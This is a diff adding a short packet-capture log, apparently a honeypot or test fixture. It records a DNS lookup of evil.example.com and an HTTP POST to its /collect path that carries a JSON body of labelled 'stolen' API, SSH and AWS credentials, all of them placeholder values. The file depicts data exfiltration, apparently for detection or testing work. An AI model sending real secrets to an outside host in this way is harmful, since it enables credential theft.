@@ -1,0 +1,11 @@
+12:00:01.100000 IP 172.17.0.2.54321 > 8.8.8.8.53: 1+ A? evil.example.com. (33)
+12:00:01.150000 IP 8.8.8.8.53 > 172.17.0.2.54321: 1 1/0/0 A 93.184.216.34 (49)
+12:00:01.200000 IP 172.17.0.2.43210 > 93.184.216.34.80: Flags [S], seq 1, win 64240, length 0
+12:00:01.210000 IP 172.17.0.2.43210 > 93.184.216.34.80: Flags [P.], seq 1:220, win 502, length 219
+POST /collect HTTP/1.1
+Host: evil.example.com
+User-Agent: python-requests/2.31.0
+Content-Type: application/json
+Content-Length: 143
+
+{"stolen_api_key": "honeypot_fake_key_do_not_use_sk_1234567890abcdef", "ssh_key_path": "/tmp/honeypot_ssh_key_never_exist", "aws": "AKIAIOSFODNN7EXAMPLE"}
